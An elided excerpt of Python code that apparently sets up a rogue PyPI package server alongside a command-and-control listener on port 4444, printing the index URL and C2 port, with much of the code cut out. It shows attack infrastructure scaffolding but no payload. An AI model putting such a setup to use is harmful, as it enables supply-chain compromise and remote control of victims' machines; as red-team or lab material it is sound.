...
class PyPIServer:
    ...
    def __init__(self, port=8080, packages_dir="packages"):
        self.port = port
    ...
    def start(self):
        """Start PyPI server"""
        # Save current directory and change to packages dir
        original_dir = os.getcwd()
        packages_abs = os.path.abspath(self.packages_dir)
        os.chdir(packages_abs)
        ...
        try:
            ...
            print(f"[PyPI] Serving packages from: {packages_abs}")
...
def main():
    ...
    # Get server IP - accept from command line or auto-detect
    if len(sys.argv) > 1:
        local_ip = sys.argv[1]
        print(f"[*] Using provided IP: {local_ip}")
    else:
        local_ip = get_network_ip()
        print(f"[*] Auto-detected IP: {local_ip}")
    
    print(f"[*] PyPI URL: http://{local_ip}:8080/simple/")
    print(f"[*] C2 Port: 4444")
    print(f"\n[*] Servers binding to 0.0.0.0 (all interfaces)")
    print()
    
    # Start PyPI server in separate thread
    pypi = PyPIServer(port=8080)
